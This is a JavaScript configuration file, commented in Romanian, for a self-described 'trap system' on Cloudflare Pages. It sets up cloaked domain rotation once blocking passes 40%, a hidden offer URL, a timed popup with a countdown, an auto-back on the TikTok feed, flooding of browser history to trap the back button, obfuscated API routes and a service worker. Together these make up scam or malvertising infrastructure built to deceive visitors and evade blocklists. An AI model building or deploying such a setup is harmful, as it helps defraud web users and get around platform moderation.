// config.js — configurare globală trap system (sursă unică de adevăr)
// Editează ROTATION_DOMAINS cu domeniile tale Cloudflare Pages
window.__CONFIG = window.__CONFIG || {};

Object.assign(window.__CONFIG, {

  // --- OFFER ---
  // OFFER_URL e setat ca secret Cloudflare Pages — nu îl pune aici
  // wrangler pages secret put OFFER_URL --project-name recoreco

  // --- DOMENII ---
  ROTATION_DOMAINS: [
    'https://recoreco.pages.dev',          // principal
    // 'https://recoreco2.pages.dev',      // backup 1 — decomentează după deploy
    // 'https://your-custom-domain.com',   // backup 2 — custom domain
  ],
  CLOAK_THRESHOLD: 0.40,     // 40% din request-uri blocked = rotate

  // --- TIMING ---
  POPUP_DELAY_MS: 20000,       // delay până la popup (ms)
  AUTO_BACK_MS: 1000,          // delay auto-back pe tiktok feed (ms)
  POPUP_COUNTDOWN_S: 300,      // countdown în popup (secunde)

  // --- A/B TEST ---
  AB_ENABLED: true,
  AB_VARIANTS: [
    { delay: 15000, weight: 33 },
    { delay: 20000, weight: 34 },
    { delay: 25000, weight: 33 }
  ],

  // --- GEO ---
  GEO_ALLOWED: [],             // gol = toate țările permise; ex: ['RO','US','GB']
  GEO_BLOCKED: ['CN','RU'],    // țări blocate

  // --- FREQUENCY CAP ---
  FREQ_CAP_ENABLED: true,
  FREQ_CAP_HOURS: 24,          // nu mai arată popup la același UID timp de X ore

  // --- TRACKING ---
  TRACK_VISIT: true,
  TRACK_POPUP: true,
  TRACK_CLAIM: true,

  // --- CHANNELS ---
  BROADCAST_CHANNEL: 'trap_ch',
  HB_CHANNEL: 'trap_sw_hb',
  DB_NAME: 'trap_db',
  SW_SCOPE: '/',
  POPUP_PATH: '/popup',

  // --- RUTE OBFUSCATE (matching cu SW route map) ---
  ROUTES: {
    claim:  '/c',   // /api/claim
    health: '/h',   // /api/health
    event:  '/e',   // /api/event
    visit:  '/v',   // /api/visit
    popup:  '/p'    // /popup/index.html
  },

  // --- HISTORY ---
  HISTORY_FLOOD_COUNT: 50,

  // --- DEBUG ---
  DEBUG: false

});
